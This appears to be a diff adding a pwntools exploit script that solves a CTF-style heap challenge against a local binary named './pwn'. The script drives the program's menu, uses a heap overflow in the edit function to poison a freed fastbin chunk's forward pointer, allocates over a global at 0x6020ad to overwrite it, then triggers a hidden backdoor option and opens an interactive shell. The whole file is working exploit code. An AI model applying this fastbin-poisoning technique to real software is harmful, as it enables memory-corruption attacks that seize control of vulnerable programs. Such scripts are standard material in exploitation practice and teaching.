@@ -1,0 +1,28 @@
+from pwn import *
+context.log_level="debug"
+sh=process("./pwn")
+def cmd(c):
+    sh.sendlineafter(b"Your choice :", str(c).encode())
+def add(size,ctt):
+    cmd(1)
+    sh.sendlineafter(b"Size of Heap : ", str(size).encode())
+    sh.sendafter(b"Content of heap:", ctt)
+def edit(idx,size,ctt):
+    cmd(2)
+    sh.sendlineafter(b"Index :", str(idx).encode())
+    sh.sendafter(b"Size of Heap : ", str(size).encode())
+    sh.sendafter(b"Content of heap : ",ctt)
+def dele(idx):
+    cmd(3)
+    sh.sendlineafter(b"Index :", str(idx).encode())
+def backdoor():
+    cmd(4869)
+add(0x60,b'a') #0
+add(0x60,b'a') #1
+dele(1)
+edit(0,0x80,b'a'*0x60+p64(0)+p64(0x71)+p64(0x6020ad)+p64(0))
+add(0x60,b'1')
+add(0x60,b'\xff'*0x60)
+gdb.attach(sh)
+backdoor()
+sh.interactive()
